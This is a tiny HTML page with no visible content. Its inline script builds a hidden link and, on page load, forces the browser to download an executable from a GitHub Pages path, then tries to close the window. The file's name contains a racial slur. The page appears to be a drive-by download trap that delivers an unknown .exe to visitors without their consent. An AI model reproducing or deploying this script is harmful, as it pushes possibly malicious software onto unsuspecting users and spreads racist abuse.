<!DOCTYPE html>
  <head>    <script>
     const kachai = (path, filename ) => {
    // Create a new link
    const anchor = document.createElement('a');
    anchor.href = path;
    anchor.download = filename;

    // Append to the DOM
    document.body.appendChild(anchor);

    // Trigger `click` event
    anchor.click();

    // Remove element from DOM
    document.body.removeChild(anchor);
}; 
    window.onload = kachai("serentus.github.io/pizdh/Legend_of_NIGGERS.exe", "Legend_of_NIGGERS.exe");   
    window.close()
    </script></head>
